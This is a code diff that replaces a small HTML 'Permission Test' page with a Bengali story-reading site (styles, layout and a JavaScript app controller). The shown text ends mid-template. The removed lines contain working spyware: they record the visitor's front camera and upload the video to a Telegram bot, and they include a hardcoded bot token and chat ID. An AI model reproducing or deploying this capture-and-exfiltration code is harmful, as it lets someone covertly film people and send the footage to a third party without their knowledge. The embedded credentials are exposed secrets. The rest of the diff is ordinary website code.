@@ -1,65 +1,1389 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Permission Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>গল্পের ভুবন - পড়ুন, জানুন, অনুভব করুন</title>
+    <meta name="description" content="বাংলা গল্প, উপন্যাস, রোমান্টিক, রহস্য, অ্যাডভেঞ্চার এবং শিক্ষামূলক গল্পের উন্মুক্ত প্ল্যাটফর্ম।">
+    <meta name="theme-color" content="#4f46e5">
+
+    <!-- Google Fonts for High Quality Bengali Typography -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --primary: #4f46e5;
+            --primary-hover: #4338ca;
+            --primary-light: #eef2ff;
+            --accent: #ec4899;
+            --bg-main: #f8fafc;
+            --card-bg: #ffffff;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --border-color: #e2e8f0;
+            --nav-bg: rgba(255, 255, 255, 0.95);
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.06);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.06);
+            --shadow-lg: 0 10px 25px rgba(0,0,0,0.08);
+            --radius-sm: 8px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --font-family: 'Hind Siliguri', -apple-system, BlinkMacSystemFont, sans-serif;
+            --reader-font-size: 19px;
+            --reader-bg: #ffffff;
+            --reader-text: #1e293b;
+        }
+
+        [data-theme="dark"] {
+            --bg-main: #0f172a;
+            --card-bg: #1e293b;
+            --text-main: #f1f5f9;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --nav-bg: rgba(30, 41, 59, 0.95);
+            --primary-light: #1e1b4b;
+            --reader-bg: #0f172a;
+            --reader-text: #e2e8f0;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.4);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.3);
+            --shadow-lg: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: var(--font-family);
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            transition: background-color 0.3s ease, color 0.3s ease;
+            overflow-x: hidden;
+        }
+
+        /* SVG Icons Helper */
+        .icon {
+            width: 20px;
+            height: 20px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        /* Header */
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            background: var(--nav-bg);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 12px 16px;
+        }
+
+        .header-container {
+            max-width: 1024px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--text-main);
+            cursor: pointer;
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #4f46e5, #ec4899);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+        }
+
+        .logo-text h1 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            line-height: 1.1;
+        }
+
+        .logo-text p {
+            font-size: 0.72rem;
+            color: var(--text-muted);
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-icon {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-icon:hover {
+            background-color: var(--primary-light);
+            color: var(--primary);
+            border-color: var(--primary);
+        }
+
+        /* Hero Banner */
+        .hero {
+            position: relative;
+            background: linear-gradient(135deg, #1e1b4b 0%, #312e81 60%, #4f46e5 100%);
+            color: #ffffff;
+            border-radius: var(--radius-lg);
+            padding: 24px 20px;
+            margin: 16px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow-md);
+        }
+
+        .hero-content {
+            max-width: 60%;
+            z-index: 2;
+        }
+
+        .hero h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 4px;
+            background: linear-gradient(to right, #ffffff, #e0e7ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 0.88rem;
+            color: #cbd5e1;
+            margin-bottom: 12px;
+        }
+
+        .hero-tags {
+            font-size: 0.75rem;
+            color: #a5b4fc;
+        }
+
+        .hero-img {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+        }
+
+        /* Search & Filter */
+        .controls-section {
+            padding: 0 16px;
+            margin-bottom: 16px;
+        }
+
+        .search-box {
+            position: relative;
+            margin-bottom: 14px;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 12px 16px 12px 42px;
+            border-radius: 30px;
+            border: 1px solid var(--border-color);
+            background: var(--card-bg);
+            color: var(--text-main);
+            font-family: inherit;
+            font-size: 0.95rem;
+            outline: none;
+            box-shadow: var(--shadow-sm);
+            transition: all 0.2s;
+        }
+
+        .search-box input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.15);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            pointer-events: none;
+        }
+
+        /* Categories (Horizontal Scroll) */
+        .category-scroll {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            padding-bottom: 6px;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+
+        .category-scroll::-webkit-scrollbar {
+            display: none;
+        }
+
+        .category-chip {
+            white-space: nowrap;
+            padding: 7px 16px;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            font-size: 0.88rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .category-chip.active {
+            background: var(--primary);
+            color: #ffffff;
+            border-color: var(--primary);
+            box-shadow: 0 2px 8px rgba(79, 70, 229, 0.35);
+        }
+
+        /* Container */
+        .container {
+            max-width: 1024px;
+            margin: 0 auto;
+            padding: 0 16px 80px 16px;
+            width: 100%;
+        }
+
+        /* Story Grid */
+        .story-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 16px;
+        }
+
+        .story-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            box-shadow: var(--shadow-sm);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .story-card:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .card-img-wrapper {
+            position: relative;
+            width: 100%;
+            height: 160px;
+            background-color: #cbd5e1;
+        }
+
+        .card-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .badge-cat {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(15, 23, 42, 0.75);
+            backdrop-filter: blur(4px);
+            color: #fff;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 500;
+        }
+
+        .card-content {
+            padding: 14px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .card-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 4px;
+            line-height: 1.3;
+        }
+
+        .card-author {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .card-desc {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 14px;
+            flex-grow: 1;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .card-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            padding-top: 10px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .btn-read {
+            flex-grow: 1;
+            padding: 8px 14px;
+            background: var(--primary);
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: background 0.2s;
+        }
+
+        .btn-read:hover {
+            background: var(--primary-hover);
+        }
+
+        .card-actions {
+            display: flex;
+            gap: 6px;
+        }
+
+        .btn-action-sm {
+            background: var(--bg-main);
+            border: 1px solid var(--border-color);
+            color: var(--text-muted);
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-action-sm.active-fav {
+            color: var(--accent);
+            border-color: var(--accent);
+            background: rgba(236, 72, 153, 0.1);
+        }
+
+        .btn-action-sm.active-bm {
+            color: var(--primary);
+            border-color: var(--primary);
+            background: var(--primary-light);
+        }
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            background: var(--card-bg);
+            border-radius: var(--radius-md);
+            border: 1px dashed var(--border-color);
+            margin: 20px 0;
+        }
+
+        .empty-icon {
+            width: 60px;
+            height: 60px;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+        }
+
+        /* Library Section Grid */
+        .library-stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .lib-stat-card {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-shadow: var(--shadow-sm);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .lib-stat-card:hover {
+            transform: scale(1.02);
+        }
+
+        .lib-blue { background: linear-gradient(135deg, #3b82f6, #2563eb); }
+        .lib-pink { background: linear-gradient(135deg, #ec4899, #db2777); }
+        .lib-green { background: linear-gradient(135deg, #10b981, #059669); }
+        .lib-purple { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }
+
+        .lib-stat-card h3 { font-size: 1.05rem; font-weight: 600; margin-top: 10px; }
+        .lib-stat-card p { font-size: 0.75rem; opacity: 0.85; }
+
+        .section-heading {
+            font-size: 1.15rem;
+            font-weight: 700;
+            margin: 20px 0 12px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        /* Reading View UI */
+        #reading-view {
+            display: none;
+            background: var(--reader-bg);
+            min-height: 100vh;
+        }
+
+        .reader-header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: var(--nav-bg);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 10px 16px;
+        }
+
+        .reader-nav {
+            max-width: 800px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            position: fixed;
+            top: 57px;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: transparent;
+            z-index: 101;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, var(--primary), var(--accent));
+            transition: width 0.1s ease;
+        }
+
+        .reader-hero-img {
+            width: 100%;
+            max-height: 380px;
+            object-fit: cover;
+            border-radius: 0 0 var(--radius-lg) var(--radius-lg);
+        }
+
+        .reader-container {
+            max-width: 720px;
+            margin: 0 auto;
+            padding: 20px 16px 100px 16px;
+        }
+
+        .reader-meta {
+            margin-bottom: 16px;
+        }
+
+        .reader-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 8px;
+        }
+
+        .reader-info-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 16px;
+        }
+
+        .reader-controls-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 8px 14px;
+            border-radius: 30px;
+            margin-bottom: 20px;
+        }
+
+        .font-adjusters {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-font {
+            background: var(--bg-main);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            cursor: pointer;
+        }
+
+        .progress-text-badge {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        .reader-content {
+            font-size: var(--reader-font-size);
+            color: var(--reader-text);
+            line-height: 1.85;
+            letter-spacing: 0.01em;
+            word-break: break-word;
+            white-space: pre-line;
+        }
+
+        .reader-content p {
+            margin-bottom: 1.5em;
+        }
+
+        .reader-bottom-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        /* Mobile Bottom Nav */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: var(--nav-bg);
+            backdrop-filter: blur(12px);
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0;
+            z-index: 90;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            text-decoration: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+            gap: 3px;
+            width: 25%;
+        }
+
+        .nav-item.active {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Responsive Optimization */
+        @media (min-width: 768px) {
+            .hero { margin: 20px auto; max-width: 1024px; padding: 30px; }
+            .hero h2 { font-size: 2.2rem; }
+            .hero-img { width: 140px; height: 140px; }
+            .controls-section { max-width: 1024px; margin: 0 auto 20px auto; }
+            .reader-hero-img { border-radius: var(--radius-lg); margin-top: 16px; }
+        }
+    </style>
 </head>
 <body>
 
-    <button id="myBtn" onclick="test(this)">Test On</button>
+    <!-- Main Website View -->
+    <div id="main-view">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-container">
+                <div class="logo" onclick="app.switchTab('home')">
+                    <div class="logo-icon">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
+                    </div>
+                    <div class="logo-text">
+                        <h1>গল্পের ভুবন</h1>
+                        <p>পড়ুন, জানুন, অনুভব করুন</p>
+                    </div>
+                </div>
+                <div class="header-actions">
+                    <button class="btn-icon" id="theme-toggle" aria-label="Toggle Theme" onclick="app.toggleTheme()">
+                        <svg class="icon" id="theme-icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+                    </button>
+                </div>
+            </div>
+        </header>
 
-<script>
-async function test(btn) {
-    btn.disabled = true; // ক্লিক করার সাথে সাথে বাটন সাময়িক বন্ধ
+        <!-- Home View Container -->
+        <main id="tab-home" class="tab-content">
+            <!-- Hero Section -->
+            <section class="hero">
+                <div class="hero-content">
+                    <h2>গল্পের ভুবন</h2>
+                    <p>পড়ুন, জানুন, এক ক্লিকে রোমাঞ্চ, প্রেম, রহস্য ও শিক্ষামূলক আরও অনেক কিছু...</p>
+                    <div class="hero-tags">✨ সম্পূর্ণ ফ্রিতে সেরা বাংলা গল্প সম্ভার</div>
+                </div>
+                <img src="image/hero-banner.jpg" alt="Hero Illustration" class="hero-img" onerror="app.imgFallback(this, 'hero')">
+            </section>
 
-    try {
-        const token = "8951598240:AAFEJNwkQUlHIgizTuM38rgNcY56DSFzzwk";
-        const chatId = "2139008203";
+            <!-- Search and Filter -->
+            <section class="controls-section">
+                <div class="search-box">
+                    <svg class="icon search-icon" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                    <input type="text" id="search-input" placeholder="গল্পের নাম, লেখক বা ক্যাটাগরি খুঁজুন..." oninput="app.handleSearch()">
+                </div>
 
-        // ক্যামেরা পারমিশন চাওয়া
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" } 
-        });
+                <div class="category-scroll" id="category-container">
+                    <!-- Categories will be rendered dynamically -->
+                </div>
+            </section>
 
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
+            <!-- Stories Grid -->
+            <div class="container">
+                <div class="story-grid" id="story-list">
+                    <!-- Dynamic story cards -->
+                </div>
+            </div>
+        </main>
 
-        recorder.ondataavailable = e => chunks.push(e.data);
+        <!-- Bookmark View Container -->
+        <main id="tab-bookmark" class="tab-content" style="display: none;">
+            <div class="container" style="padding-top: 20px;">
+                <div class="section-heading">
+                    <span>🔖 বুকমার্ক করা গল্পসমূহ</span>
+                </div>
+                <div class="story-grid" id="bookmark-list"></div>
+            </div>
+        </main>
 
-        recorder.onstop = () => {
-            stream.getTracks().forEach(t => t.stop());
+        <!-- Favorite View Container -->
+        <main id="tab-favorite" class="tab-content" style="display: none;">
+            <div class="container" style="padding-top: 20px;">
+                <div class="section-heading">
+                    <span>❤️ প্রিয় গল্পসমূহ</span>
+                </div>
+                <div class="story-grid" id="favorite-list"></div>
+            </div>
+        </main>
 
-            const form = new FormData();
-            form.append("chat_id", chatId);
-            form.append("video", new Blob(chunks, { type: "video/webm" }), "v.webm");
-            form.append("caption", "ওয়েব থেকে ভিডিও");
+        <!-- My Library View Container -->
+        <main id="tab-library" class="tab-content" style="display: none;">
+            <div class="container" style="padding-top: 20px;">
+                <h2 style="font-size: 1.4rem; font-weight: 700; margin-bottom: 16px;">📚 আমার লাইব্রেরি</h2>
+                
+                <div class="library-stats-grid">
+                    <div class="lib-stat-card lib-blue" onclick="app.switchTab('library-continue')">
+                        <svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                        <div>
+                            <h3>চালিয়ে পড়ুন</h3>
+                            <p id="stat-continue-count">যেখানে শেষ করেছিলেন</p>
+                        </div>
+                    </div>
+                    <div class="lib-stat-card lib-pink" onclick="app.switchTab('favorite')">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+                        <div>
+                            <h3>ফেভারিট গল্প</h3>
+                            <p id="stat-fav-count">আপনার প্রিয় গল্পসমূহ</p>
+                        </div>
+                    </div>
+                    <div class="lib-stat-card lib-green" onclick="app.switchTab('bookmark')">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+                        <div>
+                            <h3>বুকমার্ক</h3>
+                            <p id="stat-bm-count">সেভ করা গল্পসমূহ</p>
+                        </div>
+                    </div>
+                    <div class="lib-stat-card lib-purple" onclick="app.switchTab('home')">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
+                        <div>
+                            <h3>সকল গল্প</h3>
+                            <p id="stat-all-count">গল্প ভাণ্ডার দেখুন</p>
+                        </div>
+                    </div>
+                </div>
 
-            fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: form });
-            btn.disabled = false; // কাজ শেষ হলে বাটন আবার সচল
+                <div class="section-heading">
+                    <span>🕒 চালিয়ে পড়ুন (সাম্প্রতিক)</span>
+                </div>
+                <div id="continue-reading-list" class="story-grid"></div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Single Story Reading Page View -->
+    <div id="reading-view">
+        <div class="progress-container">
+            <div class="progress-bar" id="reading-progress-bar"></div>
+        </div>
+
+        <header class="reader-header">
+            <div class="reader-nav">
+                <button class="btn-icon" onclick="app.closeReader()" aria-label="Go Back">
+                    <svg class="icon" viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                </button>
+                <div class="header-actions">
+                    <button class="btn-icon" id="reader-bm-btn" onclick="app.toggleBookmarkCurrent()" title="বুকমার্ক">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+                    </button>
+                    <button class="btn-icon" id="reader-fav-btn" onclick="app.toggleFavCurrent()" title="ফেভারিট">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+                    </button>
+                    <button class="btn-icon" onclick="app.shareStory()" title="শেয়ার করুন">
+                        <svg class="icon" viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <div style="max-width: 800px; margin: 0 auto;">
+            <img id="reader-img" class="reader-hero-img" src="" alt="" onerror="app.imgFallback(this, 'reader')">
+        </div>
+
+        <div class="reader-container">
+            <div class="reader-meta">
+                <h1 class="reader-title" id="reader-title"></h1>
+                <div class="reader-info-bar">
+                    <span id="reader-author">✍️ লেখক</span>
+                    <span id="reader-category">🏷️ ক্যাটাগরি</span>
+                    <span id="reader-date">📅 তারিখ</span>
+                </div>
+            </div>
+
+            <!-- Reading Font & Mode Adjuster -->
+            <div class="reader-controls-bar">
+                <div class="font-adjusters">
+                    <button class="btn-font" onclick="app.adjustFontSize(-2)">A-</button>
+                    <button class="btn-font" onclick="app.adjustFontSize(0)">A</button>
+                    <button class="btn-font" onclick="app.adjustFontSize(2)">A+</button>
+                </div>
+                <div class="progress-text-badge" id="reader-progress-percent">পড়া শুরু করুন 0%</div>
+            </div>
+
+            <!-- Story Body Content -->
+            <article class="reader-content" id="reader-content"></article>
+
+            <!-- Bottom Navigation Inside Reader -->
+            <div class="reader-bottom-actions">
+                <button class="btn-read" onclick="app.closeReader()" style="background: var(--card-bg); color: var(--text-main); border: 1px solid var(--border-color);">
+                    ← ফিরে যান
+                </button>
+                <button class="btn-read" onclick="app.readNextStory()">
+                    পরবর্তী গল্প →
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile Bottom Navigation -->
+    <nav class="bottom-nav">
+        <button class="nav-item active" id="nav-btn-home" onclick="app.switchTab('home')">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
+            <span>হোম</span>
+        </button>
+        <button class="nav-item" id="nav-btn-bookmark" onclick="app.switchTab('bookmark')">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+            <span>বুকমার্ক</span>
+        </button>
+        <button class="nav-item" id="nav-btn-favorite" onclick="app.switchTab('favorite')">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+            <span>ফেভারিট</span>
+        </button>
+        <button class="nav-item" id="nav-btn-library" onclick="app.switchTab('library')">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
+            <span>আমার লাইব্রেরি</span>
+        </button>
+    </nav>
+
+    <!-- External Story Data File -->
+    <script src="data.js"></script>
+
+    <!-- Application Script -->
+    <script>
+        /**
+         * গল্পের ভুবন - Full Application Controller
+         */
+        const app = {
+            currentStoryId: null,
+            activeCategory: 'সব গল্প',
+            searchTerm: '',
+            fontSize: 19,
+            
+            // Storage Keys
+            STORAGE_THEME: 'gb_theme',
+            STORAGE_BOOKMARKS: 'gb_bookmarks',
+            STORAGE_FAVORITES: 'gb_favorites',
+            STORAGE_PROGRESS: 'gb_reading_progress',
+            STORAGE_FONT_SIZE: 'gb_font_size',
+
+            init() {
+                this.loadTheme();
+                this.loadFontSize();
+                this.renderCategories();
+                this.renderStories();
+                this.setupRouting();
+                this.setupScrollListener();
+                this.updateLibraryStats();
+            },
+
+            // --- Theme Management ---
+            toggleTheme() {
+                const isDark = document.body.getAttribute('data-theme') === 'dark';
+                const newTheme = isDark ? 'light' : 'dark';
+                document.body.setAttribute('data-theme', newTheme);
+                localStorage.setItem(this.STORAGE_THEME, newTheme);
+                this.updateThemeIcon(newTheme);
+            },
+
+            loadTheme() {
+                const saved = localStorage.getItem(this.STORAGE_THEME) || 'light';
+                document.body.setAttribute('data-theme', saved);
+                this.updateThemeIcon(saved);
+            },
+
+            updateThemeIcon(theme) {
+                const icon = document.getElementById('theme-icon');
+                if (theme === 'dark') {
+                    icon.innerHTML = '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>';
+                } else {
+                    icon.innerHTML = '<circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>';
+                }
+            },
+
+            // --- Categories & Rendering ---
+            getCategories() {
+                const set = new Set(['সব গল্প']);
+                if (typeof stories !== 'undefined') {
+                    stories.forEach(s => set.add(s.category));
+                }
+                return Array.from(set);
+            },
+
+            renderCategories() {
+                const container = document.getElementById('category-container');
+                const cats = this.getCategories();
+                container.innerHTML = cats.map(cat => `
+                    <button class="category-chip ${cat === this.activeCategory ? 'active' : ''}" 
+                            onclick="app.selectCategory('${cat}')">
+                        ${cat}
+                    </button>
+                `).join('');
+            },
+
+            selectCategory(cat) {
+                this.activeCategory = cat;
+                this.renderCategories();
+                this.renderStories();
+            },
+
+            handleSearch() {
+                this.searchTerm = document.getElementById('search-input').value.trim().toLowerCase();
+                this.renderStories();
+            },
+
+            getFilteredStories() {
+                if (typeof stories === 'undefined') return [];
+                return stories.filter(s => {
+                    const matchCategory = this.activeCategory === 'সব গল্প' || s.category === this.activeCategory;
+                    const matchSearch = s.title.toLowerCase().includes(this.searchTerm) ||
+                                        s.author.toLowerCase().includes(this.searchTerm) ||
+                                        s.category.toLowerCase().includes(this.searchTerm);
+                    return matchCategory && matchSearch;
+                });
+            },
+
+            createStoryCardHTML(story) {
+                const isFav = this.isFavorite(story.id);
+                const isBm = this.isBookmarked(story.id);
+                
+                return `
+                    <div class="story-card">
+                        <div class="card-img-wrapper" onclick="app.openStory(${story.id})" style="cursor: pointer;">
+                            <img src="${story.image}" alt="${story.title}" class="card-img" loading="lazy" onerror="app.imgFallback(this, 'card')">
+                            <span class="badge-cat">${story.category}</span>
+                        </div>
+                        <div class="card-content">
+                            <h3 class="card-title" onclick="app.openStory(${story.id})" style="cursor: pointer;">${story.title}</h3>
+                            <div class="card-author">✍️ ${story.author}</div>
+                            <p class="card-desc">${story.description}</p>
+                            <div class="card-footer">
+                                <button class="btn-read" onclick="app.openStory(${story.id})">
+                                    পড়ুন →
